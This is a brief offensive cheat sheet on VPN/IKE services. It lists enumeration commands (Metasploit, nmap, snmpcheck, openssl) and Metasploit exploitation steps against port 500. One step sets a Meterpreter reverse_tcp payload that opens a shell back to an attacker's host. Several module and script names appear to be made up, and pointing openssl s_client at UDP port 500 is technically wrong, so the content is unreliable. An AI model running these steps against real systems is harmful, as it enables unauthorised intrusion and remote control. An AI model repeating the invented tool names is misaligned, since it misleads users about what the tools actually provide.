# VPN Protocols

## Enumeration

### Metasploit

##### ikev2_enum
```bash
use auxiliary/scanner/vpn/ikev2_enum
set RHOSTS [IP]
set RPORT 500
run
```

### Nmap

##### nmap (IKE scan)
```bash
nmap -p 500 --script=ike-version [IP]
```

##### nmap (IKE fingerprint)
```bash
nmap -p 500 --script=ike-fingerprint [IP]
```

##### nmap (IKE vulnerability scan)
```bash
nmap -p 500 --script=ike-cve-2008-1645 [IP]
```

### snmpcheck

##### snmpcheck (SNMP enumeration on VPN device)
```bash
snmpcheck -t [IP] -c public
```

### OpenSSL

##### openssl (Check for IKE service)
```bash
openssl s_client -connect [IP]:500
```


---
---


## Exploitation

##### cve-2008-1645_ike
```bash
use exploit/windows/vpn/cve_2008_1645_ike
set RHOSTS [IP]
set RPORT 500
run
```

##### ikev2_auth_bypass
```bash
use exploit/windows/vpn/ikev2_auth_bypass
set RHOSTS [IP]
set RPORT 500
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [IP]
set LPORT [port]
run
```

##### ikev1_vuln
```bash
use exploit/windows/vpn/ikev1_vuln
set RHOSTS [IP]
set RPORT 500
run
```
